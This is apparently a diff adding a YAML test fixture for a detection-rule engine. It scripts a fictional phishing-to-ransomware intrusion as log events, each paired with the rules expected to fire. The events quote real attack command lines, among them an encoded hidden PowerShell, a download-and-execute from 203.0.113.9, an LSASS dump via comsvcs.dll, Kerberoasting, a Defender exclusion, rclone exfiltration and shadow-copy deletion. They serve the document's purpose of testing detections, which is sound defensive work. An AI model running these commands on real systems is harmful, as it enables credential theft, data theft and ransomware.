@@ -1,0 +1,126 @@
+# A made-up but realistic intrusion, one event per step. CI checks that each step
+# fires exactly the rules listed in `expect`, in Python and in the browser engine.
+name: From a phishing document to ransomware
+host: FIN-LAPTOP-07
+steps:
+  - time: "09:12"
+    title: The invoice macro starts PowerShell
+    story: An accountant opens Facture_Oct.docm. The macro launches a hidden, encoded PowerShell.
+    logsource: process_creation
+    event:
+      parent.name: winword.exe
+      process.name: powershell.exe
+      process.path: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      process.command_line: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
+      user: 'CORP\s.benali'
+    expect: [DL-0001, DL-0003]
+  - time: "09:12"
+    title: Stage two is pulled and run in memory
+    story: The decoded script downloads the loader and runs it without touching disk.
+    logsource: process_creation
+    event:
+      parent.name: powershell.exe
+      process.name: powershell.exe
+      process.command_line: 'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.9/l.ps1'')"'
+      user: 'CORP\s.benali'
+    expect: [DL-0002]
+  - time: "09:14"
+    title: It survives a reboot
+    story: The loader drops itself in AppData and adds a Run key.
+    logsource: registry_set
+    event:
+      process.name: powershell.exe
+      registry.key: 'HKU\S-1-5-21-1004\Software\Microsoft\Windows\CurrentVersion\Run'
+      registry.value: OneDriveUpdate
+      registry.data: 'C:\Users\s.benali\AppData\Roaming\Microsoft\odu.exe'
+    expect: [DL-0009]
+  - time: "09:31"
+    title: Who are the domain admins?
+    story: Hands-on-keyboard starts. The operator checks the privileged groups.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: net.exe
+      process.command_line: 'net group "Domain Admins" /domain'
+      user: 'CORP\s.benali'
+    expect: [DL-0020]
+  - time: "09:33"
+    title: Normal admin noise
+    story: The same minute, IT runs a routine check on another host. Nothing should fire.
+    logsource: process_creation
+    event:
+      parent.name: explorer.exe
+      process.name: powershell.exe
+      process.command_line: 'powershell Get-Service -Name Spooler'
+      user: 'CORP\it.admin'
+    expect: []
+  - time: "09:40"
+    title: Mapping the path to Domain Admin
+    story: SharpHound collects sessions, ACLs and trusts for BloodHound.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: sharphound.exe
+      process.command_line: 'SharpHound.exe -c All --zipfilename fin.zip'
+      user: 'CORP\s.benali'
+    expect: [DL-0021]
+  - time: "09:52"
+    title: Kerberoasting the SQL service account
+    story: Rubeus requests service tickets to crack offline.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: rubeus.exe
+      process.command_line: 'Rubeus.exe kerberoast /user:svc_sql /outfile:h.txt'
+      user: 'CORP\s.benali'
+    expect: [DL-0018]
+  - time: "10:20"
+    title: Dumping LSASS with a signed Windows DLL
+    story: With a local admin token, the operator dumps LSASS through comsvcs.dll.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: rundll32.exe
+      process.command_line: 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\l.bin full'
+      user: 'CORP\svc_sql'
+    expect: [DL-0016]
+  - time: "10:41"
+    title: Moving to the file server
+    story: wmiexec runs commands on FS01 and reads the output back through ADMIN$.
+    logsource: process_creation
+    event:
+      parent.name: wmiprvse.exe
+      process.name: cmd.exe
+      process.command_line: 'cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1729676460.81 2>&1'
+      user: 'CORP\svc_sql'
+    expect: [DL-0023]
+  - time: "11:05"
+    title: Blinding Defender
+    story: An exclusion for the staging folder so the encryptor is not scanned.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: powershell.exe
+      process.command_line: 'powershell -c Add-MpPreference -ExclusionPath C:\ProgramData\fs'
+      user: 'CORP\svc_sql'
+    expect: [DL-0012]
+  - time: "11:30"
+    title: Stealing the data first
+    story: A renamed rclone pushes the finance share to cloud storage. Double extortion.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: svcupd.exe
+      process.command_line: 'svcupd.exe copy \\FS01\Finance remote:fin --transfers 16 --multi-thread-streams 8 --ignore-existing'
+      user: 'CORP\svc_sql'
+    expect: [DL-0028]
+  - time: "12:02"
+    title: No way back
+    story: Shadow copies are deleted seconds before encryption starts.
+    logsource: process_creation
+    event:
+      parent.name: cmd.exe
+      process.name: vssadmin.exe
+      process.command_line: 'vssadmin.exe Delete Shadows /All /Quiet'
+      user: 'NT AUTHORITY\SYSTEM'
+    expect: [DL-0029]
